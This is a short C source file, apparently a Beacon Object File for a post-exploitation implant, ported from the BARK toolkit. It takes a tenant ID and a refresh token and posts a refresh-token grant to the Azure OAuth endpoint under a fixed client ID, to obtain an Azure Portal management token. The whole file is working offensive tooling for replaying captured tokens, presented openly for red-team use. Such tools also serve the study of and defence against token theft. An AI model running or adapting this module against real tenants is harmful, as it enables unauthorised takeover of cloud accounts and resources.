/*
 * get_azure_portal_token_with_rt.c — BARK BOF
 * Get-AzurePortalTokenWithRefreshToken — Refresh token grant — get Azure Portal auth token
 *
 * Args : tenantId, refreshToken
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[512];
    static char bodyBuf[4096];
    static char encRT[4096];
    LPWSTR widePath = NULL;
    char  *tenantId = NULL, *refreshToken = NULL;

    BeaconDataParse(&parser, args, alen);
    tenantId     = BeaconDataExtract(&parser, NULL);
    refreshToken = BeaconDataExtract(&parser, NULL);

    if (!tenantId || MSVCRT$strlen(tenantId) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_get_azure_portal_token_with_rt <tenantId> <refreshToken>\n");
        return;
    }

    UrlEncode(refreshToken, encRT, sizeof(encRT));

    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/%s/oauth2/v2.0/token", tenantId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }

    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf), "grant_type=refresh_token&scope=https%%3A%%2F%%2Fmanagement.core.windows.net%%2F%%2F.default%%20openid%%20profile%%20offline_access&refresh_token=%s&client_id=c44b4083-3bb0-49c1-b47d-974e53cbdf3c", encRT);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Get-AzurePortalTokenWithRefreshToken\n");
    BarkTokenPost(widePath, bodyBuf);
    HFree(widePath);
}
